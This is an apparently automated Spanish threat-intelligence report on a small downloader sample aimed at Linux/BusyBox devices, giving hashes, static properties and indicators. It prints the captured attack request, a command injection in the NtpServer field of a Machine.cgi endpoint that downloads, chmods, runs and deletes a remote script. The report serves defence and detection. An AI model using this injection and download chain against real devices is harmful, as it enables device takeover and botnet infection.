# 🧬 Payload Analysis

`e44f00d72aa75b18ead969729ae05a3372345fca392a7318344b7519579e5787`

## 📌 Resumen

Texto ASCII de 367 B. La evidencia disponible identifica capacidad de descarga remota. Recurso remoto principal: `wget.sh` en `hxxp://91.92.40.XXX/wget.sh`. **Comandos observados o extraídos, en orden de aparición en la evidencia:**

1. `busybox wget hxxp://91.92.40.XXX/wget.sh -O .s`
2. `curl -o .s hxxp://91.92.40.XXX/wget.sh`
3. `chmod 777 .s`
4. `sh .s rep.avtech`
5. `rm -f .s`
6. `cd /tmp`
7. `wget hxxp://91.92.40.XXX/wge` Los comandos se presentan como evidencia observada o extraída; no se afirma ejecución salvo que la relación registrada sea `executed`. **Perfil técnico:** `Linux / BusyBox`, compatible con sistemas embebidos o IoT. BusyBox se trata como indicio de plataforma y no como prueba suficiente de que el dispositivo sea IoT. **Ficha malware:** [malware-like/oraculo/downloader/e44f00d72aa75b18ead969729ae05a3372345fca392a7318344b7519579e5787.md](../../../../../malware-like/oraculo/downloader/e44f00d72aa75b18ead969729ae05a3372345fca392a7318344b7519579e5787.md)


## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T19:51:31.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `e44f00d72aa75b18ead969729ae05a3372345fca392a7318344b7519579e5787`
- **SHA1:** `34b5254883a82e7f5139c0a8d3b579d460400e6b`
- **MD5:** `b28db07237356fe87e7217d3dd3c24de`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with very long lines (318), with CRLF line terminators |
| Tamaño | 367 B |
| Entropía | 5.23 |
| Strings | 3 |

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with very long lines (318), with CRLF line terminators; iocs=5

## 🖥️ Comandos observados / extraídos

```text
GET /cgi-bin/nobody/Machine.cgi?action=adjust_clock&NtpServer=;cd%20/tmp%3Brm%20-f%20.s%3Bwget%20http://91.92.40.XXX/wge
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| url | hxxp://91.92.40.XXX/wget.sh%20-O%20.s%3Bbusybox%20wget%20http://91.92.40.XXX/wget.sh%20-O%20.s%3Bcurl%20-o%20.s%20http://91.92.40.XXX/wget.sh%3Bchmod%20777%20.s%3Bsh%20.s%20rep.avtech%3Brm%20-f%20.s;&TimeZone=GMT | strings |
| ip | 91.92.40.XXX | static_analysis |
| ip | 190.179.169.XXX | static_analysis |
| command | GET /cgi-bin/nobody/Machine.cgi?action=adjust_clock&NtpServer=;cd%20/tmp%3Brm%20-f%20.s%3Bwget%20http://91.92.40.XXX/wge | strings |
| hash | e44f00d72aa75b18ead969729ae05a3372345fca392a7318344b7519579e5787 | static_analysis |
| ip | 45.153.34.XXX | artifact_source |

## 🔎 Triage

| Campo | Valor |
| --- | --- |
| Categoría | low interest unknown |
| Prioridad | low |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
